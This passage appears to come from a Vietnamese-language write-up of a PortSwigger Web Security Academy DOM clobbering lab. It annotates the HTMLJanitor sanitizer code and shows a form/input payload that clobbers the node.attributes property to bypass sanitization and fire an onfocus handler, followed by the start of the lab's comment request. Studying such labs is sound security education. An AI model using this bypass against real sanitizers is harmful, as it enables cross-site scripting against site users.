+<span class="w">      </span>//<span class="w"> </span>Ví<span class="w"> </span>dụ<span class="w"> </span>nodeName<span class="w"> </span><span class="s2">&quot;FORM&quot;</span><span class="w"> </span>thành<span class="w"> </span><span class="s2">&quot;form&quot;</span>.
+<span class="w">      </span>var<span class="w"> </span><span class="nv">nodeName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>node.nodeName.toLowerCase<span class="o">()</span><span class="p">;</span>
+
+<span class="w">      </span>//<span class="w"> </span>Lấy<span class="w"> </span>danh<span class="w"> </span>sách<span class="w"> </span>attribute<span class="w"> </span>được<span class="w"> </span>phép<span class="w"> </span>cho<span class="w"> </span>tag<span class="w"> </span>hiện<span class="w"> </span>tại.
+<span class="w">      </span>//<span class="w"> </span>Đây<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>là:
+<span class="w">      </span>//<span class="w"> </span>-<span class="w"> </span>undefined:<span class="w"> </span>tag<span class="w"> </span>không<span class="w"> </span>được<span class="w"> </span>phép
+<span class="w">      </span>//<span class="w"> </span>-<span class="w"> </span>boolean
+<span class="w">      </span>//<span class="w"> </span>-<span class="w"> </span>object<span class="w"> </span>chứa<span class="w"> </span>rule<span class="w"> </span>attribute
+<span class="w">      </span>//<span class="w"> </span>-<span class="w"> </span><span class="k">function</span><span class="w"> </span>trả<span class="w"> </span>về<span class="w"> </span>rule
+<span class="w">      </span>var<span class="w"> </span><span class="nv">allowedAttrs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getAllowedAttrs<span class="o">(</span>this.config,<span class="w"> </span>nodeName,<span class="w"> </span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">      </span>//<span class="w"> </span>Inline<span class="w"> </span>chứa<span class="w"> </span>block<span class="w"> </span>thì<span class="w"> </span>bị<span class="w"> </span>xem<span class="w"> </span>là<span class="w"> </span>invalid.
+<span class="w">      </span>var<span class="w"> </span><span class="nv">isInvalid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>isInline<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>containsBlockElement<span class="p">;</span>
+
+<span class="w">      </span>//<span class="w"> </span>Nếu<span class="w"> </span>node<span class="w"> </span>không<span class="w"> </span>hợp<span class="w"> </span>lệ,<span class="w"> </span>không<span class="w"> </span>nằm<span class="w"> </span>trong<span class="w"> </span>whitelist,
+<span class="w">      </span>//<span class="w"> </span>hoặc<span class="w"> </span>là<span class="w"> </span>block<span class="w"> </span>element<span class="w"> </span>lồng<span class="w"> </span>nhau<span class="w"> </span>không<span class="w"> </span>được<span class="w"> </span>phép,
+<span class="w">      </span>//<span class="w"> </span>thì<span class="w"> </span>xóa<span class="w"> </span>tag<span class="w"> </span>này.
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>
+<span class="w">        </span>isInvalid
+<span class="w">        </span><span class="o">||</span><span class="w"> </span>shouldRejectNode<span class="o">(</span>node,<span class="w"> </span>allowedAttrs<span class="o">)</span>
+<span class="w">        </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>!this.config.keepNestedBlockElements<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>isNestedBlockElement<span class="o">)</span>
+<span class="w">      </span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>//<span class="w"> </span>Với<span class="w"> </span>SCRIPT/STYLE<span class="w"> </span>thì<span class="w"> </span>xóa<span class="w"> </span>luôn<span class="w"> </span>cả<span class="w"> </span>nội<span class="w"> </span>dung<span class="w"> </span>bên<span class="w"> </span>trong.
+<span class="w">        </span>//<span class="w"> </span>Vì<span class="w"> </span>giữ<span class="w"> </span>lại<span class="w"> </span>text<span class="w"> </span>trong<span class="w"> </span>script/style<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>nguy<span class="w"> </span>hiểm<span class="w"> </span>hoặc<span class="w"> </span>vô<span class="w"> </span>nghĩa.
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!<span class="o">(</span>node.nodeName<span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;SCRIPT&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>node.nodeName<span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;STYLE&#39;</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
+
+<span class="w">          </span>//<span class="w"> </span>Với<span class="w"> </span>tag<span class="w"> </span>thường,<span class="w"> </span>unwrap<span class="w"> </span>node:
+<span class="w">          </span>//<span class="w"> </span>đưa<span class="w"> </span>toàn<span class="w"> </span>bộ<span class="w"> </span>child<span class="w"> </span>của<span class="w"> </span>node<span class="w"> </span>lên<span class="w"> </span>trước<span class="w"> </span>node<span class="w"> </span>hiện<span class="w"> </span>tại.
+<span class="w">          </span>//
+<span class="w">          </span>//<span class="w"> </span>Ví<span class="w"> </span>dụ:
+<span class="w">          </span>//<span class="w"> </span>&lt;bad&gt;&lt;b&gt;Hello&lt;/b&gt;&lt;/bad&gt;
+<span class="w">          </span>//
+<span class="w">          </span>//<span class="w"> </span>Sau<span class="w"> </span>khi<span class="w"> </span>unwrap:
+<span class="w">          </span>//<span class="w"> </span>&lt;b&gt;Hello&lt;/b&gt;
+<span class="w">          </span><span class="k">while</span><span class="w"> </span><span class="o">(</span>node.childNodes.length<span class="w"> </span>&gt;<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span>parentNode.insertBefore<span class="o">(</span>node.childNodes<span class="o">[</span><span class="m">0</span><span class="o">]</span>,<span class="w"> </span>node<span class="o">)</span><span class="p">;</span>
+<span class="w">          </span><span class="o">}</span>
+<span class="w">        </span><span class="o">}</span>
+
+<span class="w">        </span>//<span class="w"> </span>Xóa<span class="w"> </span>node<span class="w"> </span>hiện<span class="w"> </span>tại<span class="w"> </span>khỏi<span class="w"> </span>DOM.
+<span class="w">        </span>parentNode.removeChild<span class="o">(</span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">        </span>//<span class="w"> </span>DOM<span class="w"> </span>thay<span class="w"> </span>đổi<span class="w"> </span>nên<span class="w"> </span>sanitize<span class="w"> </span>lại<span class="w"> </span>parent.
+<span class="w">        </span>this._sanitize<span class="o">(</span>document,<span class="w"> </span>parentNode<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="o">}</span>
+
+<span class="w">      </span>//<span class="w"> </span><span class="o">==========================</span>
+<span class="w">      </span>//<span class="w"> </span>PHẦN<span class="w"> </span>QUAN<span class="w"> </span>TRỌNG<span class="w"> </span>NHẤT
+<span class="w">      </span>//<span class="w"> </span>Sanitize<span class="w"> </span>attributes
+<span class="w">      </span>//<span class="w"> </span><span class="o">==========================</span>
+
+<span class="w">      </span>//<span class="w"> </span>Duyệt<span class="w"> </span>qua<span class="w"> </span>toàn<span class="w"> </span>bộ<span class="w"> </span>attribute<span class="w"> </span>của<span class="w"> </span>node.
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>Ví<span class="w"> </span>dụ:
+<span class="w">      </span>//<span class="w"> </span>&lt;form<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span><span class="w"> </span><span class="nv">action</span><span class="o">=</span><span class="s2">&quot;/x&quot;</span>&gt;
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>node.attributes<span class="w"> </span>thường<span class="w"> </span>là<span class="w"> </span>NamedNodeMap<span class="w"> </span>gồm:
+<span class="w">      </span>//<span class="w"> </span>-<span class="w"> </span>onclick
+<span class="w">      </span>//<span class="w"> </span>-<span class="w"> </span>action
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>Nếu<span class="w"> </span>onclick<span class="w"> </span>không<span class="w"> </span>được<span class="w"> </span>whitelist<span class="w"> </span>thì<span class="w"> </span>sẽ<span class="w"> </span>bị<span class="w"> </span>remove.
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>Nhưng<span class="w"> </span>trong<span class="w"> </span>DOM<span class="w"> </span>clobbering,<span class="w"> </span>attacker<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>làm:
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>&lt;form<span class="w"> </span><span class="nv">onclick</span><span class="o">=</span>alert<span class="o">(</span><span class="m">1</span><span class="o">)</span>&gt;
+<span class="w">      </span>//<span class="w">   </span>&lt;input<span class="w"> </span><span class="nv">id</span><span class="o">=</span>attributes&gt;
+<span class="w">      </span>//<span class="w"> </span>&lt;/form&gt;
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>Một<span class="w"> </span>số<span class="w"> </span>DOM<span class="w"> </span>property<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>bị<span class="w"> </span>clobber<span class="w"> </span>bởi<span class="w"> </span>phần<span class="w"> </span>tử<span class="w"> </span>con<span class="w"> </span>có<span class="w"> </span>id/name
+<span class="w">      </span>//<span class="w"> </span>tương<span class="w"> </span>ứng.<span class="w"> </span>Khi<span class="w"> </span>đó<span class="w"> </span>node.attributes<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>không<span class="w"> </span>còn<span class="w"> </span>trỏ<span class="w"> </span>đến
+<span class="w">      </span>//<span class="w"> </span>danh<span class="w"> </span>sách<span class="w"> </span>attribute<span class="w"> </span>thật<span class="w"> </span>nữa.
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>Nếu<span class="w"> </span>node.attributes<span class="w"> </span>bị<span class="w"> </span>clobber<span class="w"> </span>thành<span class="w"> </span>input<span class="w"> </span>element,
+<span class="w">      </span>//<span class="w"> </span>thì<span class="w"> </span>node.attributes.length<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>là<span class="w"> </span>undefined.
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>Khi<span class="w"> </span>đó<span class="w"> </span>điều<span class="w"> </span>kiện:
+<span class="w">      </span>//<span class="w"> </span>a<span class="w"> </span>&lt;<span class="w"> </span>node.attributes.length
+<span class="w">      </span>//
+<span class="w">      </span>//<span class="w"> </span>sẽ<span class="w"> </span>không<span class="w"> </span>chạy<span class="w"> </span>đúng,<span class="w"> </span>khiến<span class="w"> </span>vòng<span class="w"> </span>lặp<span class="w"> </span>bỏ<span class="w"> </span>qua<span class="w"> </span>việc<span class="w"> </span>kiểm<span class="w"> </span>tra<span class="w"> </span>attribute.
+<span class="w">      </span>//<span class="w"> </span>Kết<span class="w"> </span>quả:<span class="w"> </span>onclick<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>không<span class="w"> </span>bị<span class="w"> </span>xóa.
+<span class="w">      </span><span class="k">for</span><span class="w"> </span><span class="o">(</span>var<span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="w"> </span>a<span class="w"> </span>&lt;<span class="w"> </span>node.attributes.length<span class="p">;</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>var<span class="w"> </span><span class="nv">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>node.attributes<span class="o">[</span>a<span class="o">]</span><span class="p">;</span>
+
+<span class="w">        </span>//<span class="w"> </span>Kiểm<span class="w"> </span>tra<span class="w"> </span>attribute<span class="w"> </span>hiện<span class="w"> </span>tại<span class="w"> </span>có<span class="w"> </span>nên<span class="w"> </span>bị<span class="w"> </span>xóa<span class="w"> </span>không.
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>shouldRejectAttr<span class="o">(</span>attr,<span class="w"> </span>allowedAttrs,<span class="w"> </span>node<span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">          </span>//<span class="w"> </span>Xóa<span class="w"> </span>attribute<span class="w"> </span>khỏi<span class="w"> </span>node.
+<span class="w">          </span>node.removeAttribute<span class="o">(</span>attr.name<span class="o">)</span><span class="p">;</span>
+
+<span class="w">          </span>//<span class="w"> </span>Vì<span class="w"> </span>node.attributes<span class="w"> </span>là<span class="w"> </span>live<span class="w"> </span>collection,
+<span class="w">          </span>//<span class="w"> </span>khi<span class="w"> </span>xóa<span class="w"> </span>một<span class="w"> </span>attribute<span class="w"> </span>thì<span class="w"> </span>các<span class="w"> </span>phần<span class="w"> </span>tử<span class="w"> </span>phía<span class="w"> </span>sau<span class="w"> </span>bị<span class="w"> </span>dồn<span class="w"> </span>index.
+<span class="w">          </span>//
+<span class="w">          </span>//<span class="w"> </span>Ví<span class="w"> </span>dụ<span class="w"> </span>attributes:
+<span class="w">          </span>//<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>onclick
+<span class="w">          </span>//<span class="w"> </span><span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>href
+<span class="w">          </span>//
+<span class="w">          </span>//<span class="w"> </span>Xóa<span class="w"> </span>onclick<span class="w"> </span>xong<span class="w"> </span>thì<span class="w"> </span>href<span class="w"> </span>dồn<span class="w"> </span>về<span class="w"> </span>index<span class="w"> </span><span class="m">0</span>.
+<span class="w">          </span>//<span class="w"> </span>Nếu<span class="w"> </span>không<span class="w"> </span>a--<span class="w"> </span>thì<span class="w"> </span>vòng<span class="w"> </span>lặp<span class="w"> </span>sẽ<span class="w"> </span>nhảy<span class="w"> </span>qua<span class="w"> </span>href.
+<span class="w">          </span><span class="nv">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>a<span class="w"> </span>-<span class="w"> </span><span class="m">1</span><span class="p">;</span>
+<span class="w">        </span><span class="o">}</span>
+<span class="w">      </span><span class="o">}</span>
+
+<span class="w">      </span>//<span class="w"> </span>Sau<span class="w"> </span>khi<span class="w"> </span>xử<span class="w"> </span>lý<span class="w"> </span>attribute<span class="w"> </span>của<span class="w"> </span>node<span class="w"> </span>hiện<span class="w"> </span>tại,
+<span class="w">      </span>//<span class="w"> </span>tiếp<span class="w"> </span>tục<span class="w"> </span>sanitize<span class="w"> </span>các<span class="w"> </span>node<span class="w"> </span>con<span class="w"> </span>bên<span class="w"> </span>trong<span class="w"> </span>nó.
+<span class="w">      </span>this._sanitize<span class="o">(</span>document,<span class="w"> </span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Chuyển<span class="w"> </span>sang<span class="w"> </span>sibling<span class="w"> </span>tiếp<span class="w"> </span>theo.
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="o">((</span><span class="nv">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>treeWalker.nextSibling<span class="o">()))</span><span class="p">;</span>
+<span class="w">  </span><span class="o">}</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">function</span><span class="w"> </span>createTreeWalker<span class="o">(</span>document,<span class="w"> </span>node<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w"> </span>TreeWalker<span class="w"> </span>giúp<span class="w"> </span>duyệt<span class="w"> </span>DOM<span class="w"> </span>theo<span class="w"> </span>node<span class="w"> </span><span class="nb">type</span><span class="w"> </span>được<span class="w"> </span>chọn.
+<span class="w">    </span>//
+<span class="w">    </span>//<span class="w"> </span>Ở<span class="w"> </span>đây<span class="w"> </span>nó<span class="w"> </span>duyệt:
+<span class="w">    </span>//<span class="w"> </span>-<span class="w"> </span>Text<span class="w"> </span>node
+<span class="w">    </span>//<span class="w"> </span>-<span class="w"> </span>Element<span class="w"> </span>node
+<span class="w">    </span>//<span class="w"> </span>-<span class="w"> </span>Comment<span class="w"> </span>node
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>document.createTreeWalker<span class="o">(</span>
+<span class="w">      </span>node,
+<span class="w">      </span>NodeFilter.SHOW_TEXT<span class="w"> </span><span class="p">|</span><span class="w"> </span>NodeFilter.SHOW_ELEMENT<span class="w"> </span><span class="p">|</span><span class="w"> </span>NodeFilter.SHOW_COMMENT,
+<span class="w">      </span>null,
+<span class="w">      </span><span class="nb">false</span>
+<span class="w">    </span><span class="o">)</span><span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span><span class="k">function</span><span class="w"> </span>getAllowedAttrs<span class="o">(</span>config,<span class="w"> </span>nodeName,<span class="w"> </span>node<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>rule<span class="w"> </span>của<span class="w"> </span>tag<span class="w"> </span>là<span class="w"> </span><span class="k">function</span><span class="w"> </span>thì<span class="w"> </span>gọi<span class="w"> </span><span class="k">function</span><span class="w"> </span>đó.
+<span class="w">    </span>//<span class="w"> </span>Function<span class="w"> </span>có<span class="w"> </span>thể<span class="w"> </span>quyết<span class="w"> </span>định<span class="w"> </span>attribute<span class="w"> </span>được<span class="w"> </span>phép<span class="w"> </span>dựa<span class="w"> </span>trên<span class="w"> </span>node<span class="w"> </span>hiện<span class="w"> </span>tại.
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span>config.tags<span class="o">[</span>nodeName<span class="o">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;function&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>config.tags<span class="o">[</span>nodeName<span class="o">](</span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>không<span class="w"> </span>thì<span class="w"> </span>lấy<span class="w"> </span>rule<span class="w"> </span>trực<span class="w"> </span>tiếp<span class="w"> </span>từ<span class="w"> </span>config.
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>config.tags<span class="o">[</span>nodeName<span class="o">]</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span><span class="k">function</span><span class="w"> </span>shouldRejectNode<span class="o">(</span>node,<span class="w"> </span>allowedAttrs<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>allowedAttrs<span class="w"> </span>là<span class="w"> </span>undefined,
+<span class="w">    </span>//<span class="w"> </span>nghĩa<span class="w"> </span>là<span class="w"> </span>tag<span class="w"> </span>này<span class="w"> </span>không<span class="w"> </span>tồn<span class="w"> </span>tại<span class="w"> </span>trong<span class="w"> </span>whitelist.
+<span class="w">    </span>//<span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>reject<span class="w"> </span>node.
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span><span class="nv">allowedAttrs</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;undefined&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>true<span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>allowedAttrs<span class="w"> </span>là<span class="w"> </span>boolean:
+<span class="w">    </span>//<span class="w"> </span><span class="nb">true</span><span class="w">  </span><span class="o">=</span>&gt;<span class="w"> </span>cho<span class="w"> </span>phép<span class="w"> </span>tag
+<span class="w">    </span>//<span class="w"> </span><span class="nb">false</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>reject<span class="w"> </span>tag
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span><span class="nv">allowedAttrs</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;boolean&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>!allowedAttrs<span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>allowedAttrs<span class="w"> </span>là<span class="w"> </span>object<span class="w"> </span>hoặc<span class="w"> </span><span class="k">function</span><span class="w"> </span>trả<span class="w"> </span>về<span class="w"> </span>object,
+<span class="w">    </span>//<span class="w"> </span>thì<span class="w"> </span>tag<span class="w"> </span>được<span class="w"> </span>giữ<span class="w"> </span>lại,<span class="w"> </span>attribute<span class="w"> </span>sẽ<span class="w"> </span>kiểm<span class="w"> </span>tra<span class="w"> </span>sau.
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>false<span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span><span class="k">function</span><span class="w"> </span>shouldRejectAttr<span class="o">(</span>attr,<span class="w"> </span>allowedAttrs,<span class="w"> </span>node<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w"> </span>Normalize<span class="w"> </span>tên<span class="w"> </span>attribute<span class="w"> </span>về<span class="w"> </span>lowercase.
+<span class="w">    </span>//<span class="w"> </span>Ví<span class="w"> </span>dụ<span class="w"> </span><span class="s2">&quot;ONCLICK&quot;</span><span class="w"> </span>thành<span class="w"> </span><span class="s2">&quot;onclick&quot;</span>.
+<span class="w">    </span>var<span class="w"> </span><span class="nv">attrName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>attr.name.toLowerCase<span class="o">()</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span><span class="nv">allowedAttrs</span><span class="w"> </span><span class="o">===</span><span class="w"> </span>true:
+<span class="w">    </span>//<span class="w"> </span>cho<span class="w"> </span>phép<span class="w"> </span>tất<span class="w"> </span>cả<span class="w"> </span>attribute<span class="w"> </span>của<span class="w"> </span>tag<span class="w"> </span>này.
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">allowedAttrs</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">true</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>false<span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>rule<span class="w"> </span>của<span class="w"> </span>attribute<span class="w"> </span>là<span class="w"> </span><span class="k">function</span>:
+<span class="w">    </span>//<span class="w"> </span>gọi<span class="w"> </span><span class="k">function</span><span class="w"> </span>để<span class="w"> </span>kiểm<span class="w"> </span>tra<span class="w"> </span>value.
+<span class="w">    </span>//
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span><span class="k">function</span><span class="w"> </span>trả<span class="w"> </span><span class="nb">false</span><span class="w"> </span>thì<span class="w"> </span>reject<span class="w"> </span>attribute.
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span>allowedAttrs<span class="o">[</span>attrName<span class="o">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;function&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>!allowedAttrs<span class="o">[</span>attrName<span class="o">](</span>attr.value,<span class="w"> </span>node<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>attribute<span class="w"> </span>không<span class="w"> </span>xuất<span class="w"> </span>hiện<span class="w"> </span>trong<span class="w"> </span>whitelist:
+<span class="w">    </span>//<span class="w"> </span>reject.
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span>allowedAttrs<span class="o">[</span>attrName<span class="o">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;undefined&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>true<span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>attribute<span class="w"> </span>được<span class="w"> </span><span class="nb">set</span><span class="w"> </span>explicitly<span class="w"> </span>là<span class="w"> </span>false:
+<span class="w">    </span>//<span class="w"> </span>reject.
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>allowedAttrs<span class="o">[</span>attrName<span class="o">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">false</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span>true<span class="p">;</span>
+
+<span class="w">    </span>//<span class="w"> </span>Nếu<span class="w"> </span>rule<span class="w"> </span>là<span class="w"> </span>string:
+<span class="w">    </span>//<span class="w"> </span>chỉ<span class="w"> </span>cho<span class="w"> </span>phép<span class="w"> </span>attribute<span class="w"> </span>nếu<span class="w"> </span>value<span class="w"> </span>khớp<span class="w"> </span>chính<span class="w"> </span>xác<span class="w"> </span>string<span class="w"> </span>đó.
+<span class="w">    </span>//
+<span class="w">    </span>//<span class="w"> </span>Ví<span class="w"> </span>dụ:
+<span class="w">    </span>//<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>//<span class="w">   </span>target:<span class="w"> </span><span class="s2">&quot;_blank&quot;</span>
+<span class="w">    </span>//<span class="w"> </span><span class="o">}</span>
+<span class="w">    </span>//
+<span class="w">    </span>//<span class="w"> </span>thì<span class="w"> </span>target<span class="w"> </span>chỉ<span class="w"> </span>được<span class="w"> </span>giữ<span class="w"> </span>nếu<span class="w"> </span>attr.value<span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;_blank&quot;</span>.
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>typeof<span class="w"> </span>allowedAttrs<span class="o">[</span>attrName<span class="o">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;string&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="o">(</span>allowedAttrs<span class="o">[</span>attrName<span class="o">]</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span>attr.value<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>//<span class="w"> </span>Các<span class="w"> </span>trường<span class="w"> </span>hợp<span class="w"> </span>còn<span class="w"> </span>lại<span class="w"> </span>thì<span class="w"> </span>không<span class="w"> </span>reject.
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>false<span class="p">;</span>
+<span class="w">  </span><span class="o">}</span>
+
+<span class="w">  </span>//<span class="w"> </span>Trả<span class="w"> </span>constructor<span class="w"> </span>HTMLJanitor<span class="w"> </span>ra<span class="w"> </span>ngoài<span class="w"> </span>factory.
+<span class="w">  </span><span class="k">return</span><span class="w"> </span>HTMLJanitor<span class="p">;</span>
+
+<span class="o">}))</span><span class="p">;</span>
+</code></pre></div>
+<p><img alt="image.png" src="image%2025.png" /></p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+<p><img alt="image.png" src="image%2027.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, nếu như chúng ta có thể ghi đè <code>attributes</code> của một node bằng cách tạo một thẻ con có id là <code>attributes</code> thì khi đó <code>node.attributes</code> sẽ trả về thẻ con đó nên khi lấy length sẽ là undefined ⇒ loop không vào được ⇒ không sanitize nữa.</p>
+</li>
+<li>
+<p>Thực hiện dùng thẻ <code>form</code> với <code>input</code> là con như sau để ghi đè. Ngoài ra vì bài cần auto nên cần thêm focus. Do form mặc định không focus được nên cần thêm tabindex</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code>&lt;form<span class="w"> </span><span class="nv">id</span><span class="o">=</span><span class="s2">&quot;xyz&quot;</span><span class="w">  </span><span class="nv">tabindex</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">onfocus</span><span class="o">=</span>print<span class="o">()</span>&gt;&lt;input<span class="w"> </span><span class="nv">id</span><span class="o">=</span>attributes&gt;&lt;/form&gt;
+</code></pre></div>
+</li>
+<li>
+<p>Thực hiện gửi request</p>
+<div class="highlight"><pre><span></span><code>POST<span class="w"> </span>/post/comment<span class="w"> </span>HTTP/2
+Host:<span class="w"> </span>0a3400ca032176df80380323007c000a.web-security-academy.net
+Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=</span>lxqe29PYhv0EQYREM45bXVb1ZqIbJ3Pm
+Content-Length:<span class="w"> </span><span class="m">260</span>
+Content-Type:<span class="w"> </span>application/x-www-form-urlencoded
+
